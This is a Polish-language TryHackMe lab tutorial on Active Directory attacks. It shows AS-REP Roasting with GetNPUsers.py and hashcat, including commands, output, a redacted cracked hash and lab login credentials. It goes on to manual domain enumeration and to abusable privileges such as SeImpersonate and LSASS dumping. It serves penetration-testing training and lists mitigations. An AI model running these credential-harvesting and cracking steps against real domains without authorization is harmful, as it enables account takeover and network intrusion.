---

W poprzednim pokoju,[OGŁOSZENIE:Podstawowe enumeracje](https://tryhackme.com/room/adbasicenumeration) – omówiliśmy różne działania rozpoznawcze i enumeracyjne, które nie wymagają uwierzytelniania. W tej sali skupimy się na działaniach wykonywanych po uzyskaniu dostępu do uwierzytelnionego konta.

## Cele edukacyjne

Po ukończeniu tego pokoju dowiesz się:

- Palenie AS-REP
- Używając `net`polecenia do wyliczenia między innymi
- Wyliczanie przy użyciu modułu ActiveDirectory PowerShell
- Wyliczanie przy użyciu modułu PowerView programu PowerSploit
- Wyliczanie za pomocą BloodHound

## Wymagania wstępne dotyczące nauki

Aby osiągnąć maksymalne korzyści, powinieneś dobrze rozumieć koncepcje i protokoły sieciowe oraz znać systemy Linux, MS Windows i Active Directory. Możesz zgłębić te tematy lub odświeżyć swoją wiedzę, zapoznając się z poniższymi materiałami, w zależności od Twoich celów:

- Moduł [Podstawy systemu Windows i usługi AD](https://tryhackme.com/module/windows-and-active-directory-fundamentals) , w tym ostatnia sala – Podstawy [usługi Active Directory](https://tryhackme.com/room/winadbasics)
- Moduł [Podstawy](https://tryhackme.com/module/linux-fundamentals) Linuksa
- Moduł wiersza [poleceń](https://tryhackme.com/module/command-line)
- Moduł [sieciowy](https://tryhackme.com/module/networking)​

Oprócz zapoznania się z wyżej wymienionymi tematami, zalecamy ukończenie sali [AD: Podstawy wyliczania](https://tryhackme.com/room/adbasicenumeration) .

## Uruchamianie sieci

Zanim przejdziesz do następnego zadania, kliknij zielony przycisk **Start** pod schematem sieci. Daj sieci wystarczająco dużo czasu na uruchomienie.

Z siecią można połączyć się na dwa sposoby:

### Opcja 1: Użycie AttackBox

Kliknij przycisk **„Uruchom AttackBox”** u góry tego pokoju (upewnij się, że najpierw uruchomiłeś sieć). Gdy wszystko będzie gotowe, AttackBox będzie dostępny w widoku podzielonym. Jeśli się nie wyświetla, kliknij przycisk „ **Pokaż widok podzielony”** u góry strony.

Warto zauważyć, że jeśli uruchomiłeś AttackBox w innym pokoju przed uruchomieniem sieci, będziesz musiał zamknąć instancję AttackBox i uruchomić ją ponownie, aby uzyskać dostęp do sieci tego pokoju.

### Opcja 2: Przez połączenie VPN

Alternatywnie, możesz połączyć się z siecią przez VPN. Aby nawiązać połączenie VPN z tą siecią, przejdź do [strony dostępu](https://tryhackme.com/access) , kliknij kartę **Sieci** , wybierz **Jr-Pentester-AD-v01-BH** i naciśnij przycisk **Pobierz plik konfiguracyjny** . Jeśli nie widzisz tego pliku dostępnego do pobrania, upewnij się, że sieć w pokoju została uruchomiona i odczekaj kilka minut.

![Na karcie Sieci musisz wybrać Jr-Pentester-AD-v01-BH i kliknąć przycisk Pobierz plik konfiguracyjny.](https://cdn-images.tryhackme.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1747423024213.png)

Następnie uruchom poniższe polecenie w tym samym katalogu, w którym znajduje się plik konfiguracyjny sieci VPN:

`sudo openvpn [your_configuration_file_name.ovpn]`

**Uwaga** : Ważne jest, aby nie **używać** AttackBox iVPNpołączenie jednocześnie.

### Sprawdzanie łączności z siecią

Możesz uruchomić `route`polecenie, aby sprawdzić, czy komputer atakującego może komunikować się z siecią docelową. Poniższy terminal pokazuje przykładowe dane wyjściowe. Zwróć uwagę na wiersz `10.211.12.0`:

Terminal

```shell-session
root@tryhackme:~# route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    100    0        0 ens5
10.10.0.0       0.0.0.0         255.255.0.0     U     100    0        0 ens5
10.10.0.1       0.0.0.0         255.255.255.255 UH    100    0        0 ens5
[...]
10.211.12.0     10.250.12.1     255.255.255.0   UG    1000   0        0 tun0
10.250.12.0     0.0.0.0         255.255.255.0   U     0      0        0 tun0
[...]
```

Możesz też użyć polecenia `ip route`. Zwróć szczególną uwagę na `10.211.12.0`wiersz:

Terminal

```shell-session
root@tryhackme:~# ip route
default via 10.10.0.1 dev ens5 proto dhcp src 10.10.130.73 metric 100 
10.10.0.0/16 dev ens5 proto kernel scope link src 10.10.130.73 metric 100 
10.10.0.1 dev ens5 proto dhcp scope link src 10.10.130.73 metric 100 
[...]
10.211.12.0/24 via 10.250.11.1 dev tun0 metric 1000 
10.250.12.0/24 dev tun0 proto kernel scope link src 10.250.12.2 
[...]
```

Sprawdź, czy podsieć jest widoczna `10.211.12.0`w wynikach polecenia. Jeśli tak, Twój komputer powinien móc komunikować się z siecią docelową. Ponadto włączyliśmy reagowanie komputerów laboratoryjnych na polecenie `ping`, dzięki czemu możesz go użyć do weryfikacji łączności.

## Rozwiązywanie problemów z łącznością

Jeśli nie możesz połączyć się z siecią z poziomu AttackBoxa, otwórz terminal i uruchom polecenie `tryconnectme`. Spowoduje to uruchomienie skryptu rozwiązywania problemów:

Terminal

```shell-session
root@tryhackme# tryconnectme                                                  

TryHackMe's network room connection debugger, at your service!

Before we dive deeper, please make sure that you are only using the AttackBox
and do not have your network VPN profile running anywhere!

The AttackBox uses the same VPN profile as you would use on your own machine
and you are only allowed to run the VPN profile once!

If you are running in two places, stop the other VPN and restart the AttackBox please!

If you confirm that you are only using the AttackBox, press [Y], otherwise, the debugger will quit: Y
```

Gdy już upewnisz się, że łączysz się z siecią wyłącznie za pośrednictwem AttackBox, możesz wprowadzić następujący adres IP:`10.211.12.10`

Terminal

```shell-session
[...]
In the network room, look at the network diagram and please provide an IP address being shown to you there.
Format should be X.X.X.X: 10.211.12.10

Trying to ping the VPN server at 10.211.12.250...
```

Następnie postępuj zgodnie z instrukcjami skryptu. Gdy skrypt poprosi o podanie serwera VPN, wpisz **Jr-Pentester-AD-v01-BH.**

Jeśli napotkasz jakiekolwiek problemy, skontaktuj się z nami na [Discordzie(otwiera się w nowej karcie)](https://discord.com/invite/tryhackme)lub przez e-mail na adres `support@tryhackme.com`.

Podobnie jak Kerberoasting, AS-REP Roasting zrzuca skróty kont użytkowników, które mająKerberosWstępne uwierzytelnianie wyłączone. W przeciwieństwie do Kerberoastingu, ci użytkownicy nie muszą być kontami usługowymi – jedynym wymogiem jest ustawienie flagi „Nie wymagaj wstępnego uwierzytelniania Kerberos” (UF_DONT_REQUIRE_PREAUTH) na koncie użytkownika.

Podczas standardowego uwierzytelniania Kerberos hash użytkownika szyfruje znacznik czasu, który jest następnie przetwarzany przez Centrum Dystrybucji Kluczy (KDC) odszyfrowuje w celu weryfikacji tożsamości użytkownika. Jeśli jednak wstępne uwierzytelnianie jest wyłączone, KDC pomija ten etap weryfikacji i zwraca zaszyfrowany blob AS-REP bez potwierdzania tożsamości użytkownika. Ten blob można następnie przechwycić i złamać w trybie offline, aby odzyskać hasło użytkownika.

## Prażenie AS-REP w dwóch fazach

Roasting AS-REP składa się z dwóch głównych etapów: enumeracji i eksploatacji. Najpierw identyfikuje się podatne konta użytkowników, a następnie przechwytuje i łamie pobrane hashe AS-REP w trybie offline.

### Faza 1: Enumeracja – identyfikacja kont podatnych na ataki

W tej fazie identyfikujesz konta użytkowników w Active Directory, które mają wyłączone wstępne uwierzytelnianie Kerberos. Konta bez wstępnego uwierzytelniania pozwalają każdemu w sieci zażądać biletu Kerberos (a konkretnie AS-REP) bez uprzedniego potwierdzenia swojej tożsamości. W rezultacie zaszyfrowane skróty haseł kont zostają ujawnione i narażone na ataki offline.

### Narzędzia używane

**[Rubeus(otwiera się w nowej karcie)](https://github.com/GhostPack/Rubeus)** _(tylko Windows)_

Potężne narzędzie dla systemu Windows, zaprojektowane specjalnie do testowania bezpieczeństwa i enumeracji związanej z protokołem Kerberos. Rubeus automatycznie identyfikuje podatne konta i pobiera zaszyfrowane skróty AS-REP.

**Przykładowe polecenie:** `Rubeus.exe asreproast`

To polecenie skanuje usługę Active Directory, identyfikuje konta z wyłączonym uwierzytelnianiem wstępnym i pobiera skróty gotowe do złamania w trybie offline.

**[GetNPUsers.py Impacket(otwiera się w nowej karcie)](https://github.com/fortra/impacket)** _(Linux/Windows)_

Impacket udostępnia elastyczny skrypt Pythona ( `GetNPUsers.py`) do enumeracji kont w środowiskach innych niż Windows. Aby przetestować lukę w zabezpieczeniach przed uwierzytelnianiem, należy dostarczyć `users.txt`plik zawierający nazwy użytkowników.

**Przykładowe polecenie:** `GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass`

To polecenie wylicza nazwy użytkowników wymienione w `users.txt`i zbiera skróty AS-REP dla podatnych na ataki kont, zapisując je w `hashes.txt`celu ich złamania w trybie offline.

Wybierzemy drugie podejście, ponieważ nie mamy dostępu do komputera z systemem MS Windows w tej sieci. Do przeprowadzenia pierwszej fazy użyjemy AttackBox. Pobierz załączony plik zadania zawierający nazwy użytkowników, klikając przycisk „ **Pobierz pliki zadań”** u góry tego zadania. Aby uzyskać listę nazw użytkowników w AttackBox, najłatwiej jest uruchomić terminal, uruchomić polecenie [brakujące] `cat > users.txt`, wkleić nazwy użytkowników z pliku zadania i nacisnąć Ctrl + D. Spowoduje to utworzenie `users.txt`pliku w AttackBox. Potwierdź, że plik został już utworzony, używając [brakujące] `cat users.txt`. Poniżej przedstawiono dwa polecenia:

Terminal AttackBox

```shell-session
root@attackbox:~# cat > users.txt
Administrator
Guest
krbtgt
sshd
gerald.burgess
[...]
root@attackbox:~# cat users.txt 
Administrator
Guest
krbtgt
sshd
gerald.burgess
[...]
```

Po drugie, uruchomimy `GetNPUsers.py`tak jak pokazano poniżej w terminalu:

Terminal AttackBox

```shell-session
root@attackbox:~# GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User gerald.burgess doesn't have UF_DONT_REQUIRE_PREAUTH set
[...]
```

Spowoduje to zrzucenie `hashes.txt`pliku.

### Faza 2: Eksploatacja – łamanie skrótów haseł i dostęp do sieci

Po uzyskaniu zaszyfrowanych haszy w fazie enumeracji, kolejnym krokiem jest łamanie zabezpieczeń offline. Odzyskanie prawidłowych haseł umożliwia uwierzytelnienie jako zainfekowany użytkownik, zapewniając dalszy dostęp lub eskalację uprawnień w sieci docelowej.

### Użyte narzędzie

**[Hashcat(otwiera się w nowej karcie)](https://hashcat.net/hashcat/)** _(wieloplatformowy)_

Hashcat to wysoce wydajne, szeroko stosowane narzędzie do łamania haseł. W przypadku haszy AS-REP, Hashcat używa trybu łamania **18200** .

**Przykładowe polecenie:** `hashcat -m 18200 hashes.txt wordlist.txt`

Oto co robi to polecenie:

- `-m 18200`:Określa tryb łamania skrótów AS-REP Kerberos.
- `hashes.txt`: Zawiera zebrane skróty z podatnych na ataki kont.
- `wordlist.txt`: Wybrany przez Ciebie słownik możliwych haseł.

Uruchommy `hashcat`zrzucony `hashes.txt`plik. Użyjemy polecenia `rockyou.txt`, które można znaleźć pod adresem `/usr/share/wordlists/rockyou.txt`. Złamanie hasła zajmie kilka minut. Poniższy wynik terminala pokazuje, że hasło zostało złamane. Aby uatrakcyjnić ćwiczenie, w poniższym wyniku zastąpiliśmy złamane hasło ciągiem [HASŁO USUNIĘTE]:

Terminal AttackBox

```shell-session
root@attackbox:~# hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1-66-g6a419d06) starting...
[...]
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 11 secs

$krb5asrep$23$asrepuser1@TRYHACKME.LOC:32015b1273c454cb721c60d716e37751$3a325977d253460b31b693afc82be6e543c7aa01e021b7a23372fe9efb7d8e8fd59b04ab6c6563fc52fe37f11da50b01d642b81be1aae0f0bc7be8a7e0e7c9fc54026ff07564d3c1ff0a200c522b350a4b661b1e6db83dd540de1e0283c3f7915f1d5e95a63edc940f5a9628d0b98d18298e3f4b9e4e0568caa01246d40ec135a2605cc5415e3be8058cb9e32a4d2cecd42073487105a57d2e56b0da356c11d07e105955e83b483173508542c63068f2ee10ee421df11500f9923c10009bd5b7f59bd29720ceef42ae1605cd030fcd7474d3a9a22b3797f550b1652cf367add56a2f64fd2e9ce9fa14156e5e021e:[PASSWORD REDACTED]                                         
[...]
```

**Po pęknięciu:**

Po pomyślnym złamaniu haszy, dostępne stają się prawidłowe hasła w postaci zwykłego tekstu. Możesz teraz uwierzytelniać się jako zainfekowani użytkownicy, żądać biletów Kerberos lub bezpośrednio uzyskiwać dostęp do innych zasobów sieciowych.

## Środki łagodzące

- Wymuś wstępne uwierzytelnianie Kerberos dla wszystkich kont użytkowników
- Silne, złożone hasła spowalniają łamanie ich w trybie offline
- Monitoruj nietypowe żądania AS-REP w KDC

## Najważniejsze wnioski

- AS-REP Roasting to atak Kerberos o niskim poziomie szumów i bez uwierzytelniania
- Rubeus upraszcza wyszukiwanie w systemie Windows; GetNPUsers.py oferuje kontrolę ręczną
- Sukces zależy od siły hasła i prawidłowego egzekwowania autoryzacji wstępnej

Odpowiedz na poniższe pytania

Jaką flagę należy ustawić na koncie AD, aby było ono podatne na atak AS-REP Roasting?

To zadanie będzie skupiać się na ręcznym wyliczaniu przy użyciu natywnego CMD iPowerShellpolecenia. Będzie to obejmować badanie uprawnień tokenów, identyfikację użytkowników domeny i użytkowników lokalnych (w tym kont usług), analizę sesji logowania oraz zbieranie cennych danych ze zmiennych środowiskowych i rejestru systemu Windows.

Utworzyłeś powłokę na komputerze z systemem Windows i chcesz odkryć otaczające Cię środowisko. Dla osób bardziej przyzwyczajonych do aplikacji graficznych, wiersz poleceń może początkowo wydawać się onieśmielający; jednak gdy nauczysz się podstawowych poleceń potrzebnych do realizacji swoich celów, docenisz jego wszechstronność i możliwości.

Wyobraź sobie, że znajdujesz się nocą w nieznanym budynku biurowym. Co byś zrobił? Z nastawieniem testera penetracyjnego (z odpowiednim pisemnym upoważnieniem) rozpoczniesz swoją podróż odkrywczą. Na przykład, możesz sprawdzić nazwę biura, w którym wylądowałeś, poszukać tabliczek z nazwiskami w innych biurach i sprawdzić, które drzwi są otwarte. Ręczna enumeracja to cybernetyczny odpowiednik: sprawdzisz, kim jesteś , kto jeszcze jest w pobliżu i do których drzwi (uprawnień) masz klucze.

W pewnym sensie będziesz się bawić w detektywa; musisz dowiedzieć się, gdzie jesteś i co możesz zrobić. W tym zadaniu użyjesz wbudowanych narzędzi, CMD i PowerShell, aby zebrać informacje tak dyskretnie, jak to możliwe. Ponieważ będziesz korzystać z wbudowanych narzędzi MS Windows, ta taktyka jest znana jako „życie z ziemi” (LOTL). Podobnie jak atakujący, testerzy penetracyjni często polegają na natywnych poleceniach, takich jak netenumeracja użytkowników, grup i konfiguracji, często bez wywoływania alarmów. W tym zadaniu przeprowadzimy Cię przez te natywne polecenia, aby zmapować system i domenę oraz spełnić naszą rolę detektywa.

Kim jestem?
Pierwsze pytanie, jakie zadałby każdy atakujący (lub filozof), brzmiałoby: „Kim jestem?”. W przypadku komputera to właśnie to whoamipolecenie. Aby je śledzić, użyj terminala na komputerze AttackBox, aby sshpołączyć się ze stacją roboczą za pomocą adresu IP 10.211.12.20. Użyjemy następujących danych logowania:

Nazwa użytkownika:asrepuser1
Hasło:qwerty123!
Nawiązywanie połączenia przez SSH pokazano w terminalu poniżej:

Terminal AttackBox
user@tryhackme:~# ssh asrepuser1@10.211.12.20
asrepuser1@10.211.12.20's password: 

Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

tryhackme\asrepuser1@WRK C:\Users\asrepuser1>
Właśnie wylądowaliśmy w wierszu poleceń systemu MS Windows. Jeśli w terminalu wyświetla się tryhackme\asrepuser1, to domena i nazwa użytkownika, z którą się zalogowałeś, WRKto nazwa hosta. Teraz uruchom:

Wiersz poleceń
tryhackme\asrepuser1@WRK C:\> whoami
tryhackme\asrepuser1

tryhackme\asrepuser1@WRK C:\>
To polecenie wyświetli nazwę użytkownika i domenę bieżącego użytkownika, jeśli ma to zastosowanie. Innymi słowy, jeśli przed ukośnikiem widzisz nazwę domeny, wiesz, że korzystasz z konta domenowego, na przykład . DomainName\DomainUserZ drugiej strony, jeśli widzisz nazwę komputera, oznacza to, że masz lokalne konto użytkownika, takie jak ComputerName\LocalUser.

Aby dowiedzieć się więcej o grupach i uprawnieniach konta, możemy użyć polecenia whoami /all. To polecenie wyświetli szczegółową stronę zawierającą identyfikator zabezpieczeń (SID) konta, członkostwo w grupach i uprawnienia konta.

Wiersz poleceń
tryhackme\asrepuser1@WRK C:\> whoami /all

USER INFORMATION
----------------

User Name            SID
==================== ============================================
tryhackme\asrepuser1 S-1-5-21-1966530601-3185510712-10604624-1641

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
[...]

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
[...]
To polecenie zwraca mnóstwo informacji: identyfikator SID użytkownika, członkostwo w grupach oraz uprawnienia konta. Sprawdzając członkostwo w grupach, możesz sprawdzić, czy należysz do interesujących Cię grup, takich jak lokalni administratorzy, użytkownicy domeny, czy do grupy specjalnej, takiej jak operatorzy zapasowi. Jeśli masz szczęście, możesz trafić na konto należące do administratorów domeny; oznacza to jednak, że konfiguracja docelowa jest bardzo niebezpieczna. Tak czy inaczej, informacje o grupach dostarczają wiele informacji kontekstowych, które pomogą Ci zrozumieć, co Twoje konto może zrobić.

Na przykład możesz zobaczyć takie rzeczy, jak SeChangeNotifyPrivilege , które mają wszyscy użytkownicy, oraz ciekawsze rzeczy, jak SeImpersonatePrivilege lub SeAssignPrimaryTokenPrivilege, jeśli działasz na koncie usługi lub w kontekście wysokich uprawnień.

Dlaczego to takie ważne? Niektóre uprawnienia mogą być kluczami do królestwa . Na przykład, po uwierzytelnieniu, SeImpersonatePrivilegepozwalają Twojemu kontu podszywać się pod innych zalogowanych użytkowników. Z perspektywy atakującego jest to niezwykle istotne. Konto z uprawnieniami SeImpersonatePrivilegemoże potencjalnie oszukać system i przekazać Ci powłokę SYSTEM za pomocą exploitów podszywania się pod tokeny. Na przykład, ataki typu „potato” wykorzystują dźwignię SeImpersonatePrivilegelub podobne uprawnienia do podszywania się pod token konta o wyższych uprawnieniach.

Przywileje
Wymieńmy kilka uprawnień, które mogą mieć kluczowe znaczenie w planowaniu kolejnych kroków. Najciekawsze uprawnienia, które warto sprawdzić, to:

SeImpersonatePrivilege : Jak już wspomniano, uprawnienie to pozwala procesowi podszywać się pod kontekst bezpieczeństwa innego użytkownika po uwierzytelnieniu. Atak „potato” polega na nadużywaniu tego uprawnienia.
SeAssignPrimaryTokenPrivilege : To uprawnienie pozwala procesowi przypisać token główny innego użytkownika do nowego procesu. Jest używane w połączeniu z uprawnieniem SeImpersonatePrivilege.
SeBackupPrivilege : To uprawnienie pozwala użytkownikom odczytywać dowolne pliki w systemie, ignorując uprawnienia do plików. W rezultacie atakujący mogą go wykorzystać do zrzucania poufnych plików, takich jak gałąź SAM lub SYSTEM.
SeRestorePrivilege : To uprawnienie daje możliwość zapisu do dowolnego pliku lub klucza rejestru bez przestrzegania ustalonych uprawnień. W związku z tym może być nadużywane do nadpisywania krytycznych plików systemowych lub ustawień rejestru.
SeDebugPrivilege : To uprawnienie pozwala kontu dołączyć debugger do dowolnego procesu. W rezultacie atakujący może wykorzystać to uprawnienie do zrzutu pamięci z LSASS i uzyskania danych uwierzytelniających, a nawet wstrzyknąć złośliwy kod do procesów uprzywilejowanych.
Krótko mówiąc, whoami /allinformuje o Twojej aktualnej mocy, wynikającej z przynależności do grupy lub przywilejów. Zanotuj swoje ustalenia, ponieważ wskazują one punkt wyjścia.

Informacje o systemie i domenie
Skoro już wiesz, kim jesteś, czas dowiedzieć się więcej o systemie, w którym pracujesz. Oto kilka palących pytań: Czy ten komputer należy do domeny Active Directory? Jaka jest jego nazwa hosta? W jakiej domenie lub grupie roboczej się znajduje?

Zacznijmy od kilku podstawowych poleceń. Poniższe informacje pomogą Ci dowiedzieć się, gdzie „wylądowałeś”:

hostname
systeminfo(wymaga uprawnień administratora)
set
Jak sama nazwa wskazuje, hostnamewyświetla nazwę hosta komputera. W wielu przypadkach nazwa hosta może wskazywać na rolę serwera. Na przykład w wielu firmach często można spotkać terminy takie jak „ dcw nazwach kontrolerów domeny”, pcpo których następują cyfry w nazwach komputerów dołączonych do domeny.

Z drugiej strony, systeminfowyświetla bogactwo informacji o komputerze, od wersji systemu operacyjnego po zainstalowane poprawki, i przekazuje informacje o domenie lub grupie roboczej. Informacje te mogą być bardzo cenne dla testerów penetracyjnych. Wskazówka: Możesz filtrować dane wyjściowe za pomocą systeminfo | findstr /B "OS"…System operacyjnynazwa i wersja, natomiast systeminfo | findstr /B "Domain"zwróci nazwę domeny, jeśli jest ona częścią Active Directory.

Na koniec nie powinniśmy zapominać o informacjach, które można znaleźć w zmiennych środowiskowych. Wystarczy uruchomić polecenie set, a pojawi się nietrywialna lista zmiennych, pokazująca różne informacje od katalogu domowego użytkownika po jego domenę. Należy pamiętać, że zmienna USERDOMAINjest ustawiona na nazwę komputera, chyba że komputer jest przyłączony do domeny. W wierszu poleceń programu PowerShell należy użyć polecenia Get-ChildItem Env:lub dir env:zamiast set.

Wyliczanie użytkowników i grup za pomocą poleceń NET (CMD)
Na razie wiesz, kim jesteś na hoście i kto jest (lub nie jest) częścią danej domeny. Ponadto wiesz, że Twoje konto należy do określonych grup i ma określone uprawnienia. Czas dowiedzieć się więcej o samej domenie; czas na enumerację użytkowników i grup.

NETto zestaw poleceń do przeglądania i zarządzania zasobami sieciowymi, uruchamiany w starym, dobrym wierszu poleceń. Obecność w każdym systemie MS Windows sprawia, że ​​ich opanowanie jest niezwykle przydatne i mądre. Istnieje duże prawdopodobieństwo, że korzystanie z nich NEToszczędzi Ci konieczności konfigurowania nowych narzędzi do gromadzenia informacji o użytkownikach, komputerach, grupach i innych danych domenowych. Nawet zaawansowani adwersarze używają ich do rekonesansu, ponieważ wtapiają się w zwykłą aktywność administratora. Uruchomienie NET HELPwyświetla wszystkie dostępne polecenia.

Wiersz poleceń
C:\> net help
The syntax of this command is:

NET HELP
command
     -or-
NET command /HELP

  Commands available are:

  NET ACCOUNTS             NET HELPMSG              NET STATISTICS
  NET COMPUTER             NET LOCALGROUP           NET STOP
  NET CONFIG               NET PAUSE                NET TIME
  NET CONTINUE             NET SESSION              NET USE
  NET FILE                 NET SHARE                NET USER
  NET GROUP                NET START                NET VIEW
  NET HELP

  NET HELP NAMES explains different types of names in NET HELP syntax lines.
  NET HELP SERVICES lists some of the services you can start.
  NET HELP SYNTAX explains how to read NET HELP syntax lines.
  NET HELP command | MORE displays Help one screen at a time.
W poniższych przykładach należy zauważyć, że chociaż możemy uruchomić te polecenia w programie Windows PowerShell, korzystamy z wiersza poleceń cmd.exe; co więcej, używane konto jest uwierzytelniane jako konto użytkownika domeny.

Użytkownicy domeny
Najpierw spróbuj wyświetlić listę wszystkich użytkowników w domenie za pomocą net user /domain. Poniżej znajduje się przykładowy wynik. Lista użytkowników jest długa, dlatego pokazujemy tylko pierwsze dwa wiersze.

Wiersz poleceń
C:\> net user /domain
The request will be processed at a domain controller for domain tryhackme.loc.

User accounts for \\DC.tryhackme.loc

-------------------------------------------------------------------------------
Administrator            asrepuser1               barbara.jones
daniel.turner            danielle.ali             danielle.lee
[...]
The command completed successfully.
Należy pamiętać, że użycie tej opcji net userspowoduje zapytanie komputera o konta lokalne i ich listę, podczas gdy net user /domainkontroler domeny zapyta o listę kont użytkowników domeny. Ponieważ ta druga opcja wyświetli listę wszystkich kont użytkowników w Active Directory, może to zająć sporo czasu, w zależności od wielkości firmy. Ponadto lista może pomóc w odkryciu interesujących celów, takich jak BackupAdmin.

Stąd łatwo uzyskać więcej informacji o dowolnym koncie użytkownika za pomocą net user <username> /domain. To polecenie zwróci pełną nazwę, status konta (aktywne lub nieaktywne), informacje o haśle, członkostwie w grupach i czasie ostatniego logowania. Dane wyjściowe dają dobry pogląd na uprawnienia konta docelowego i to, czy są one używane. Przykład pokazano w terminalu poniżej:

Wiersz poleceń
C:\> net user daniel.turner /domain
The request will be processed at a domain controller for domain tryhackme.loc.

User name                    daniel.turner
Full Name                    Daniel Turner
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            30/04/2025 15:17:22
Password expires             11/06/2025 15:17:22
Password changeable          01/05/2025 15:17:22
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Internet Access
The command completed successfully.
Grupy domen
Teraz, gdy masz już listę kont użytkowników domeny i więcej informacji o wybranym koncie, czas na wyświetlenie wszystkich grup domen. Grupy domen można wyświetlić za pomocą net group /domain:

Wiersz poleceń
C:\> net group /domain
The request will be processed at a domain controller for domain tryhackme.loc.

Group Accounts for \\DC.tryhackme.loc

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*HR Share RW
*Internet Access
*Key Admins
[...]
The command completed successfully.
Powyższe polecenie generuje wyniki dla wszystkich grup domen; pominęliśmy jednak kilka wierszy, aby zachować przejrzystość wyników. Niektóre z najciekawszych grup domen to:

Administratorzy domeny i administratorzy mogą posiadać klucze do całej usługi Active Directory
Administratorzy przedsiębiorstwa odgrywają kluczową rolę w lesie wielodomenowym
Operatorzy serwerów i operatorzy kopii zapasowych to uprzywilejowane wbudowane konta, które warto sprawdzić
Każda grupa zawierająca w nazwie słowo „Admin” (np. „Administratorzy SQL”) może być warta uwagi.
Generalnie rzecz biorąc, warto sprawdzić każdą grupę zawierającą w nazwie słowo „Admin”.

Kontrolery domeny i komputery domeny zawierają konta maszyn. Nazwy komputerów w domenie możemy znaleźć za pomocą net group <Group Name> / domain. Na przykład, net group "Domain Computers" /domainzwróci ono wszystkie konta komputerów istniejące w domenie. Należy pamiętać, że nazwy kont maszyn kończą się na $, na przykład DESKTOP-ACCT05$.

Możesz użyć tej samej składni, aby wyświetlić listę członków dowolnej grupy użytkowników. Na przykład, net group "Domain Admins" /domainpokaże Ci wszystkie konta należące do grupy „Administratorzy domeny”.

Jeśli chcesz sprawdzić grupy lokalne, możesz wyświetlić listę wszystkich grup lokalnych za pomocą net localgroup. Poniższy terminal pokazuje przykładowy wynik.

Wiersz poleceń
C:\> net localgroup

Aliases for \\WRK

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
[...]
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
Co więcej, jeśli chcesz poznać członków konkretnej grupy lokalnej, takiej jak Administrators, musisz wydać polecenie net localgroup Administrators. W poniższym przykładowym wyniku widzimy, że Domain Adminsnależą do grupy lokalnej Administrators, czego można się spodziewać.

Wiersz poleceń
C:\> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TRYHACKME\Domain Admins
TRYHACKME\katie.thomas
The command completed successfully.
Do tej pory wymieniliśmy użytkowników i grupy domeny oraz udało nam się pobrać informacje o każdym ważnym koncie. Jak wspomniano, netmożna z nich korzystać z poziomu wiersza poleceń i okna programu PowerShell. W ramach funkcji dostępnych wyłącznie w programie PowerShell, moduł ActiveDirectory i PowerView omówimy w dalszej części.

Zalogowani użytkownicy i sesje
Wróćmy do naszej analogii, gdy nagle znajdujesz się w ciemnym biurze. Możesz zadać sobie pytanie: „Kto jeszcze tu jest?”.

W terminologii systemów komputerowych chcemy dowiedzieć się, którzy użytkownicy zalogowali się do komputera, na przykład za pośrednictwem Pulpitu Zdalnego (RDP); co więcej, niektórzy użytkownicy mogą mieć otwarte sesje, ale sesja ta jest zablokowana. Mogą też istnieć konta usługowe uruchamiające zaplanowane zadania. Wszystkie te informacje dają nam lepsze pojęcie o systemie, w którym się znajdujemy.

Możesz uruchomić polecenie query user, lub quserw skrócie , aby wyświetlić listę użytkowników zalogowanych na komputerze. Poniższy terminal pokazuje przykładowy wynik.

Wiersz poleceń
C:\> quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 strategos             console             1  Active          2  16/05/2025 13:28
 administrator         rdp-tcp           2  Active          4  16/05/2025 17:50
 administrator         rdp-tcp           3  Active          .  16/05/2025 20:32
Możesz się dowiedzieć, że administrator jest zalogowanyRDPpodczas gdy inny użytkownik jest zalogowany na konsoli fizycznej.

